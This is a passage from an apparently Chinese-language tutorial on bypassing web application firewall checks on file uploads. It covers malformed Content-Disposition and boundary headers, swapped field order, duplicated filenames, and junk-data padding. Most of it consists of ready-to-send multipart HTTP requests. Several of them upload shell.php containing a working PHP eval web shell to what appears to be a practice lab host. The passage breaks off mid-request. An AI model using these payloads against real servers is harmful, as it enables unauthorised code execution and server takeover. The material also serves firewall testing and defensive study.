<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 05 Jan 2023 03:04:35 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xhtml+xml;charset=utf-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>access_token=c440f4d1c00e499d95ab1f1009bf52a7; Path=/</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>POST, GET, OPTIONS, DELETE</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>NSF</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2408</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="section">&lt;ResponseResult&gt;</span><span class="section">&lt;code&gt;</span><span class="attribute">1000</span>&lt;/code&gt;&lt;message&gt;<span class="number">111</span> <span class="number">1</span> FPA上传接口异常！&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;不允许上传此种类型文件：.jspx&quot;</span>,<span class="string">&quot;stack&quot;</span>:<span class="string">&quot;- com.southgis.ibase.utils.FileUtil.safeWhiteFileName(FileUtil.java:464)........&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="多个分号"><a href="#多个分号" class="headerlink" title="多个分号"></a><strong>多个分号</strong></h3><p>文件解析时，可能因为分号解析不到文件名，导致绕过。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>

<h3 id="多个等号"><a href="#多个等号" class="headerlink" title="多个等号"></a><strong>多个等号</strong></h3><p>在 POST 的内容中使用多个等号对文件上传也没有影响。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name==&quot;file_x&quot;; filename====&quot;test.php&quot;</span><br></pre></td></tr></table></figure>

<h3 id="变换-Content-Disposition-的值"><a href="#变换-Content-Disposition-的值" class="headerlink" title="变换 Content-Disposition 的值"></a><strong>变换 Content-Disposition 的值</strong></h3><p>某些WAF在解析的时候，认为 <code>Content-Disposition</code> 值一定是 <code>form-data</code> ，造成绕过。其实 <code>Content-Disposition</code> 可以任意变换或为空。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>fOrM-DaTA; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-da+ta; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>fo    r m-dat a; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-dataxx; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br></pre></td></tr></table></figure>

<h3 id="畸形的-boundary-头部"><a href="#畸形的-boundary-头部" class="headerlink" title="畸形的 boundary 头部"></a><strong>畸形的 boundary 头部</strong></h3><p><code>boundary</code> 可以变化为如下形式，且不影响上传：</p>
<p>正常的 <code>boundary</code> ：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarye111</span><br></pre></td></tr></table></figure>

<p>畸形的 <code>boundary</code> ：</p>
<p>• <code>multipart/form-data</code> 大小写可变：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111</span><br></pre></td></tr></table></figure>

<p><code>multipart/form-data</code> 与 <code>boundary</code> 之间可以使用空格分隔，且中间可以插入任何值：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data boundary=----WebKitFormBoundarye111</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data x boundary=----WebKitFormBoundarye111</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data abcdefg boundary=----WebKitFormBoundarye111</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data a\|/?!@#$%^() boundary=----WebKitFormBoundarye111</span><br></pre></td></tr></table></figure>

<p><code>multipart/form-data</code> 与 <code>boundary</code> 之间可以使用逗号分隔，且中间可以插入任何值：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data,boundary=----WebKitFormBoundarye111</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data,x,boundary=----WebKitFormBoundarye111</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data,a\|/?!@#$%^(),boundary=----WebKitFormBoundarye111</span><br></pre></td></tr></table></figure>

<p><code>boundary</code> 之前可以直接加入任何值（PHP 可行）：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data;bypass&amp;123**&#123;|&#125;boundary=----WebKitFormBoundarye111</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data bypass&amp;123**&#123;|&#125;boundary=----WebKitFormBoundarye111</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data,bypass&amp;123**&#123;|&#125;boundary=----WebKitFormBoundarye111</span><br></pre></td></tr></table></figure>

<p><code>boundary</code> 末尾可以使用逗号或分号隔开插入任何值</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarye111;123abc</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarye111,123abc</span><br></pre></td></tr></table></figure>

<h3 id="顺序颠倒"><a href="#顺序颠倒" class="headerlink" title="顺序颠倒"></a><strong>顺序颠倒</strong></h3><h4 id="交换-name-和-filename-的顺序"><a href="#交换-name-和-filename-的顺序" class="headerlink" title="交换 name 和 filename 的顺序"></a><strong>交换 name 和 filename 的顺序</strong></h4><p>因为规定了 <code>Content-Disposition</code> 必须在最前面，所以只能交换 name 和 filename 的顺序。</p>
<p>有的 WAF 可能会匹配 <code>name</code> 在前面， <code>filename</code> 在后面，可以导致绕过。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; filename=&quot;xx.php&quot;; name=&quot;file_x&quot;</span><br></pre></td></tr></table></figure>

<h4 id="交换-Content-Disposition-和-Content-Type-的顺序"><a href="#交换-Content-Disposition-和-Content-Type-的顺序" class="headerlink" title="交换 Content-Disposition 和 Content-Type 的顺序"></a><strong>交换 Content-Disposition 和 Content-Type 的顺序</strong></h4><p>与上述一样， <code>Content-Disposition</code> 和 <code>Content-Type</code> 也是能够交换顺序的。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br></pre></td></tr></table></figure>

<h4 id="交换不同-boundary-内容的顺序"><a href="#交换不同-boundary-内容的顺序" class="headerlink" title="交换不同 boundary 内容的顺序"></a><strong>交换不同 boundary 内容的顺序</strong></h4><p>不同 boundary 内容也能够交换，且不影响文件上传</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf--</span><br></pre></td></tr></table></figure>

<h3 id="数据重复"><a href="#数据重复" class="headerlink" title="数据重复"></a><strong>数据重复</strong></h3><h4 id="boundary-内容重复"><a href="#boundary-内容重复" class="headerlink" title="boundary 内容重复"></a><strong>boundary 内容重复</strong></h4><p>最后上传的文件是shell.php 而非 shell.jpg ，但是如果取的文件名时只取了第一个就会被 Bypass。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA--</span><br></pre></td></tr></table></figure>

<p>下面这样也是可以正常上传的</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA--</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA;123</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA--</span><br></pre></td></tr></table></figure>

<h4 id="filename-重复"><a href="#filename-重复" class="headerlink" title="filename 重复"></a><strong>filename 重复</strong></h4><p>最终上传成功的文件名是 shell.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg filename=&quot;shell.jpg&quot;; filename=&quot;shell.jpg&quot;; filename=&quot;shell.jpg&quot;; filename=&quot;shell.jpg&quot;; filename=&quot;shell.jpg&quot;; filename=&quot;shell.php&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a><strong>垃圾数据</strong></h3><h4 id="name-与-filename-之间插入垃圾数据"><a href="#name-与-filename-之间插入垃圾数据" class="headerlink" title="name 与 filename 之间插入垃圾数据"></a><strong>name 与 filename 之间插入垃圾数据</strong></h4><p>name 与 filename 之间插入大量垃圾数据。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-02/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hackrock.com:813</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf; </span></span><br><span class="line"><span class="language-php">filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rf--</span></span><br></pre></td></tr></table></figure>

<p>注：需在大量垃圾数据后加 <code>;</code></p>
<h4 id="boundary-字符串中加入垃圾数据"><a href="#boundary-字符串中加入垃圾数据" class="headerlink" title="boundary 字符串中加入垃圾数据"></a><strong>boundary 字符串中加入垃圾数据</strong></h4><p>boundray 字符串的值可以为任何数据（有一定的长度限制），当长度达到 WAF 无法处理时，而Web<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/cvm?from=10680">服务器</a>又能够处理，那么就可以绕过 WAF上传文件。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-01/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hackrock.com:813</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9--</span></span><br></pre></td></tr></table></figure>

<h4 id="boundray-末尾插入垃圾数据"><a href="#boundray-末尾插入垃圾数据" class="headerlink" title="boundray 末尾插入垃圾数据"></a><strong>boundray 末尾插入垃圾数据</strong></h4><p>刚才讲到过 <code>boundary</code> 末尾可以插入任何数据，那么就可以在 <code>boundary</code> 字符串末尾加入大量垃圾数据。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-01/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hackrock.com:813</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf,bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>592</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rf--</span></span><br></pre></td></tr></table></figure>

<h4 id="multipart-x2F-form-data-与-boundary-之间插入垃圾数据"><a href="#multipart-x2F-form-data-与-boundary-之间插入垃圾数据" class="headerlink" title="multipart&#x2F;form-data 与 boundary 之间插入垃圾数据"></a><strong>multipart&#x2F;form-data 与 boundary 之间插入垃圾数据</strong></h4><p>刚才讲到过 <code>multipart/form-data</code> 与 <code>boundary</code> 之间可以插入任何数据，那么就可以在 <code>multipart/form-data</code> 与 <code>boundary</code> 之间加入大量垃圾数据。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-01/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hackrock.com:813</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data 